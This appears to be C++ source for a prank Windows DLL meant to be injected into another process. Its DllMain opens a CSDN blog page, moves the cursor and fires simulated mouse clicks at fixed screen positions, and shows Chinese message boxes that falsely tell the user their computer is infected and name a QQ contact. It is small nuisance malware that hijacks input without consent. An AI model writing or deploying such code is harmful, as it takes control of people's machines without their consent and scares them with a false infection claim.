
#include <Windows.h>
#include <iostream>
#include <ctime>

extern "C" _declspec(dllexport) bool APIENTRY DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH://进程映射
		// attach to process
		// return FALSE to fail DLL load
		break;

	case DLL_PROCESS_DETACH://进程卸载
		// detach from process
		MessageBoxA(0, "请不要与东哥为敌", "警告", MB_OK | MB_ICONINFORMATION);
		break;

	case DLL_THREAD_ATTACH://线程映射
		// attach to thread
		ShellExecuteA(0, "open", "http://blog.csdn.net/program_anywhere", 0, 0, 2);//打开网页
		srand((unsigned)time(NULL));/*播种子*/
		Sleep(2000);
		SetCursorPos(490, 507);
		Sleep(50);
		mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);//模拟鼠标按下
		mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);//模拟鼠标弹起

		mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
		mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);

		MessageBoxA(0, "O(∩_∩)O哈哈~\n你电脑中毒了\n你正在被调戏\n快联系东哥来帮忙\nQQ:379168491", "东哥无处不在", MB_OK | MB_ICONINFORMATION);
	
		for (int i = 0; i < 5; i++)
		{
			SetCursorPos(0, 760);
			Sleep(1000);
			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);//模拟鼠标按下
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);//模拟鼠标弹起

			mouse_event(MOUSEEVENTF_LEFTDOWN, 0, 0, 0, 0);
			mouse_event(MOUSEEVENTF_LEFTUP, 0, 0, 0, 0);
		}
		break;

	case DLL_THREAD_DETACH://线程卸载
		// detach from thread
		break;
	}
	return TRUE; // succesful
}